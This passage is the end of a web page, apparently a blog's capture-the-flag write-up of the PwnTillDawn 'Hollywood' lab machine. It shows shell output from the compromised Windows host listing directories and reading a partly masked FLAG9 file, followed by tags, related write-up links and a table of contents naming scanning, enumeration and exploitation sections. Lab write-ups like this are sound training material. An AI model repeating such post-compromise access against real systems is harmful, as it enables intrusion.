+</span></span><span class="line"><span class="cl"><span class="n">02</span><span class="p">/</span><span class="n">13</span><span class="p">/</span><span class="n">2015</span>  <span class="n">11</span><span class="err">:</span><span class="n">02</span> <span class="n">AM</span>            <span class="n">15</span><span class="p">,</span><span class="n">956</span> <span class="n">activemq</span><span class="p">.</span><span class="n">jar</span>
+</span></span><span class="line"><span class="cl"><span class="n">11</span><span class="p">/</span><span class="n">13</span><span class="p">/</span><span class="n">2018</span>  <span class="n">05</span><span class="err">:</span><span class="n">06</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">win32</span>
+</span></span><span class="line"><span class="cl"><span class="n">11</span><span class="p">/</span><span class="n">13</span><span class="p">/</span><span class="n">2018</span>  <span class="n">05</span><span class="err">:</span><span class="n">06</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="n">win64</span>
+</span></span><span class="line"><span class="cl"><span class="n">02</span><span class="p">/</span><span class="n">13</span><span class="p">/</span><span class="n">2015</span>  <span class="n">10</span><span class="err">:</span><span class="n">54</span> <span class="n">AM</span>            <span class="n">83</span><span class="p">,</span><span class="n">820</span> <span class="n">wrapper</span><span class="p">.</span><span class="n">jar</span>
+</span></span><span class="line"><span class="cl">               <span class="n">6</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>        <span class="n">132</span><span class="p">,</span><span class="n">954</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl">               <span class="n">4</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="n">44</span><span class="p">,</span><span class="n">541</span><span class="p">,</span><span class="n">952</span><span class="p">,</span><span class="n">000</span> <span class="n">bytes</span> <span class="n">free</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>FLAG9</em></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">User</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span><span class="nb">dir
+</span></span></span><span class="line"><span class="cl"><span class="nb">dir
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span> <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="n">021A</span><span class="p">-</span><span class="n">9C32</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">Directory</span> <span class="n">of</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">User</span><span class="p">\</span><span class="n">Documents</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">03</span><span class="p">/</span><span class="n">22</span><span class="p">/</span><span class="n">2019</span>  <span class="n">04</span><span class="err">:</span><span class="n">12</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">03</span><span class="p">/</span><span class="n">22</span><span class="p">/</span><span class="n">2019</span>  <span class="n">04</span><span class="err">:</span><span class="n">12</span> <span class="n">PM</span>    <span class="p">&lt;</span><span class="n">DIR</span><span class="p">&gt;</span>          <span class="p">..</span>
+</span></span><span class="line"><span class="cl"><span class="n">03</span><span class="p">/</span><span class="n">22</span><span class="p">/</span><span class="n">2019</span>  <span class="n">04</span><span class="err">:</span><span class="n">12</span> <span class="n">PM</span>                <span class="n">43</span> <span class="n">FLAG9</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl">               <span class="n">1</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>             <span class="n">43</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl">               <span class="n">2</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="n">44</span><span class="p">,</span><span class="n">541</span><span class="p">,</span><span class="n">952</span><span class="p">,</span><span class="n">000</span> <span class="n">bytes</span> <span class="n">free</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">User</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span><span class="nb">type </span><span class="n">FLAG9</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="nb">type </span><span class="n">FLAG9</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">b017cd11a8def6b4bae78bXXXXXXXXXXXXXXXXXXX</span>               
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>Pwned</em></p>
+<p><img src="/post/Hollywood_PwnTillDawn/imgs/9.JPG"
+	
+	
+	
+	loading="lazy"
+	
+		alt="pwned"
+	
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/pwntilldawn/">PwnTillDawn</a>
+        
+            <a href="/tags/pentesting/">PenTesting</a>
+        
+            <a href="/tags/web/">Web</a>
+        
+            <a href="/tags/exploit/">Exploit</a>
+        
+            <a href="/tags/vulnerability/">Vulnerability</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/mr.blue-pwntilldawn-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/Mr.Blue_PwnTillDawn/mr.blue_pwntilldawn.JPG" loading="lazy" data-key="" data-hash="/post/Mr.Blue_PwnTillDawn/mr.blue_pwntilldawn.JPG"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Mr.Blue PwnTillDawn Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/django-pwntilldawn-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/Django_PwnTillDawn/django_pwntilldawn.JPG" loading="lazy" data-key="" data-hash="/post/Django_PwnTillDawn/django_pwntilldawn.JPG"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Django PwnTillDawn Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/elmariachi-pc-pwntilldawn-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/El-Mariachi_PwnTillDawn/elmariachi_pwntilldawn.JPG" loading="lazy" data-key="" data-hash="/post/El-Mariachi_PwnTillDawn/elmariachi_pwntilldawn.JPG"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ElMariachi-PC PwnTillDawn Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/redpanda-htb-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/RedPanda_HTB/redpanda_htb.jpg" loading="lazy" data-key="" data-hash="/post/RedPanda_HTB/redpanda_htb.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">RedPanda HTB Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/photobomb-htb-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/Photobomb_HTB/photobomb_htb.jpg" loading="lazy" data-key="" data-hash="/post/Photobomb_HTB/photobomb_htb.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Photobomb HTB Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 Abdallah Adham
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.12.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#target-information">Target Information</a></li>
+    <li><a href="#scanning">Scanning</a>
+      <ol>
+        <li><a href="#nmap-scanning">Nmap Scanning</a></li>
+      </ol>
+    </li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#ftp-enumeration">FTP Enumeration</a></li>
+        <li><a href="#smtp-enumeration">SMTP Enumeration</a></li>
+        <li><a href="#finger-enumeration">Finger Enumeration</a>
+          <ol>
+            <li><a href="#banner-grabbingbasic-connection">Banner Grabbing/Basic connection</a></li>
+          </ol>
+        </li>
+        <li><a href="#pop3-enumeration">POP3 Enumeration</a>
+          <ol>
+            <li><a href="#106-port">106 Port</a></li>
+            <li><a href="#110-port">110 Port</a></li>
+          </ol>
+        </li>
+        <li><a href="#http-enumeration">HTTP Enumeration</a>
+          <ol>
+            <li><a href="#80-port">80 Port</a></li>
+            <li><a href="#2224-port">2224 Port</a></li>
+            <li><a href="#8080-port">8080 Port</a></li>
+            <li><a href="#8161-port">8161 Port</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#exploitation">Exploitation</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
